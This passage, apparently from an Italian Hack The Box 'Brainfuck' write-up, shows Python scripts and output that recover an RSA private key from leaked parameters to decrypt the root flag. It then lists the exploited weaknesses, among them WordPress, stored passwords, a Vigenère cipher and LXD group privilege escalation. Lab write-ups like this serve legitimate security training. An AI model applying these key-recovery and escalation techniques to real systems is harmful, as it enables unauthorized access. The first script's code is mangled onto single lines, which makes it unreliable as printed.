p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 
ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 

# compute n 
n = p * q 

# Compute phi(n) 
phi = (p - 1) * (q - 1) 

# Compute modular inverse of e 
gcd, a, b = egcd(e, phi) d = a print( "n: " + str(d) ); 

# Decrypt ciphertext 
pt = pow(ct, d, n) print( "pt: " + str(pt) ) 
if __name__ == "__main__": 
    main()
```

Otteniamo il seguente output

```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# python root_flag_attack.py   
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750

```

Lo script ha fornito il testo in chiaro come un numero intero grande. Userò un terminale Python per riconvertirlo in ASCII:

Per prima cosa converto il numero intero in esadecimale usando una stringa f, quindi lo converto in byte e decodifico per ottenere ASCII.

Sfortunatamente, non c'è modo di ottenere una shell da questo percorso.

```bahs
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# python                    
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> f"{pt:x}"
'3665666331613564626238393034373531636536353636613330356262386566'
>>> bytes.fromhex(f"{pt:x}").decode()
'6efc1a5dbb8904751ce6566a305bb8ef'
>>> 

```

### Script 2 con decodifica ascii completa

```bash
#!/usr/bin/python
## RSA - Given p,q and e.. recover and use private key w/ Extended Euclidean Algorithm - crypto150-what_is_this_encryption @ alexctf 2017
# @author intrd - http://dann.com.br/ (original script here: http://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/
import binascii, base64
p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706>
ct = 4464191482107407193029781458985174670059347077041711180464892001839630524695612733715093608114410640528413484585139254108086265238684086976862243803869080347255027804246302981602877737814121702333671054544951297395059175505373579>
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y
n = p*q #product of primes
phi = (p-1)*(q-1) #modular multiplicative inverse
gcd, a, b = egcd(e, phi) #calling extended euclidean algorithm
d = a #a is decryption key
out = hex(d)
print("d_hex: " + str(out));
print("n_dec: " + str(d));
pt = pow(ct, d, n)
print("pt_dec: " + str(pt))
out = hex(pt)
out = str(out[2:-1])
print "flag"
print out.decode("hex")

```


# LESSON LEARNED

Per ottenere un punto d'appoggio iniziale sulla macchina abbiamo sfruttato cinque vulnerabilità.

1. Una vulnerabilità nota nella versione di WordPress utilizzata per ospitare il sito web. Questo avrebbe potuto essere facilmente evitato se fosse stata installata la versione con patch.

2. Una password salvata nelle impostazioni di configurazione SMTP. Sebbene la password sia mascherata, la password in chiaro può essere facilmente visualizzata nel codice sorgente. Se le impostazioni di configurazione non richiedono il salvataggio della password sul sito Web, l'utente deve cancellare la password e inserirla ogni volta che utilizza il servizio.

3. Una password memorizzata in chiaro nell'e-mail. Anche in questo caso, se è necessario che la password venga trasmessa via e-mail, all'utente dovrebbe essere stato richiesto di cambiare la password al primo accesso.

4. I forum hanno utilizzato il Vigenère Cipher che è noto per essere vulnerabile a un noto attacco di testo in chiaro. Dato che avevamo sia il testo cifrato che il corrispondente testo in chiaro, siamo riusciti a capire la chiave di cifratura.

5. È stata utilizzata una password debole per crittografare la chiave privata RSA. Poiché la password era davvero debole, JtR impiegò solo un paio di secondi per decifrarla. L'utente dovrebbe aver utilizzato una password sufficientemente lunga e difficile da decifrare. Allo stesso modo, l'utente avrebbe dovuto utilizzare un gestore di password per archiviare la chiave privata RSA invece di dover chiedere all'amministratore di pubblicarla sul sito web.

Per aumentare i privilegi ho sfruttato una vulnerabilità.

L'exploit di Privilege Escalation relativo al gruppo LXD/LXC che è una vulnerabilità che consente a un utente non privilegiato di ottenere privilegi di root (amministrativi) all'interno di un sistema Linux che utilizza LXD (Linux Containers) o LXC (Linux Containers).

LXD e LXC sono tecnologie di virtualizzazione basate su container che consentono di eseguire e isolare processi all'interno di ambienti containerizzati. Tuttavia, a causa di una vulnerabilità di configurazione, gli utenti non privilegiati possono sfruttare questa vulnerabilità per ottenere accesso root.

Il punto di partenza per sfruttare questa vulnerabilità è essere un membro del gruppo LXD/LXC nel sistema. Questo gruppo di solito ha permessi speciali per accedere e gestire i container. Utilizzando un'interazione maliziosa tra i privilegi dei container e i permessi del gruppo LXD/LXC, un utente non privilegiato può elevare i propri privilegi di sistema e ottenere l'accesso root.

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1

Per la flag senza un shell abbiamo visto un file eseguito da root che è stato utilizzato per crittografare il file root.txt utilizzando l'algoritmo RSA. Tuttavia, il file ha restituito i parametri "p", "q" ed "e" utilizzati nella crittografia RSA e quindi siamo stati in grado di decrittografare il testo cifrato. Quindi questo ha tecnicamente sfruttato due vulnerabilità: (1) divulgazione di informazioni sensibili dei parametri RSA e (2) configurazione errata della sicurezza che ha dato a un utente non privilegiato la possibilità di leggere il file debug.txt che conteneva informazioni sensibili.
